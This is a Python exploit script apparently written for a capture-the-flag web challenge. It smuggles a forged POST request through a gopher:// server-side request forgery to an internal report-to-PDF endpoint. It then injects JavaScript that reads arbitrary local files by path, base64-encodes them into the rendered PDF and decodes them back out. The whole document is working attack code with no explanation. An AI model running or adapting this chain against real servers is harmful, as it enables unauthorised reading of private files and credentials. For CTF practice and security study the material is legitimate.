import requests, re, html, urllib.parse, json, base64, time, subprocess
U="https://odyssey.web.2026.sunshinectf.games/"
def gopher(raw, timeout=120):
    enc=urllib.parse.quote(raw, safe='')
    url=f"gopher://127.0.0.1:8000/_{enc}"
    for _ in range(4):
        try:
            r=requests.get(U, params={"feed":url}, timeout=timeout)
            pre=re.search(r'<pre class="tape">(.*?)</pre>', r.text, re.S)
            return html.unescape(pre.group(1)) if pre else None
        except Exception: time.sleep(5)
    return None
def post_report(content, title="T"):
    body=urllib.parse.urlencode({"content":content,"title":title})
    raw="\r\n".join(["POST /report HTTP/1.1","Host: 127.0.0.1:8000","Content-Type: application/x-www-form-urlencoded",f"Content-Length: {len(body.encode())}","Connection: close"])+"\r\n\r\n"+body
    resp=gopher(raw)
    if not resp: return None,"noresp"
    i=resp.find("\r\n\r\n"); payload=resp[i+4:]
    try: j=json.loads(payload)
    except: return None, payload[:200]
    if "data" not in j: return None, json.dumps(j)[:300]
    d=base64.b64decode(j["data"])
    open("/challenge/workspace/out.pdf","wb").write(d)
    subprocess.run(["pdftotext","/challenge/workspace/out.pdf","/challenge/workspace/out.txt"])
    return open("/challenge/workspace/out.txt","rb").read().decode("utf-8","replace"), None

def file_read(path, binary=False):
    path_js=json.dumps(path)
    mm = "x.overrideMimeType('text/plain; charset=x-user-defined');" if binary else ""
    pay = ("<html><body><script>"
           "var x=new XMLHttpRequest();"
           "try{x.open('GET',%s,false);%s x.send();"
           "function b2a(s){var c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';var o='';var i=0;while(i<s.length){var c1=s.charCodeAt(i++)&0xff;var c2=s.charCodeAt(i++)&0xff;var c3=s.charCodeAt(i++)&0xff;var e1=c1>>2;var e2=((c1&3)<<4)|(c2>>4);var e3=((c2&15)<<2)|(c3>>6);var e4=c3&63;if(isNaN(c2)){e3=e4=64;}else if(isNaN(c3)){e4=64;}o+=c.charAt(e1)+c.charAt(e2)+(e3==64?'=':c.charAt(e3))+(e4==64?'=':c.charAt(e4));}return o;}"
           "document.write('ZB64START'+b2a(x.responseText)+'ZB64END');}"
           "catch(e){document.write('ZB64START'+b2a('ERR:'+e)+'ZB64END');}"
           "</script></body></html>") % (path_js, mm)
    txt,err=post_report(pay)
    if err: return None,err
    m=re.search(r'ZB64START(.*?)ZB64END', txt, re.S)
    if not m: return None, "nomarker: "+txt[:200]
    b64=re.sub(r'[^A-Za-z0-9+/=]','',m.group(1))
    # fix padding
    b64=b64.rstrip('=')
    b64+='='*((4-len(b64)%4)%4)
    try: return base64.b64decode(b64), None
    except Exception as e: return None, "b64err "+str(e)+" raw:"+m.group(1)[:200]

if __name__=="__main__":
    import sys
    for p in sys.argv[1:]:
        c,err=file_read(p)
        print("=== FILE",p,"err",err,"===")
        if c is not None:
            print(repr(c[:1500]))
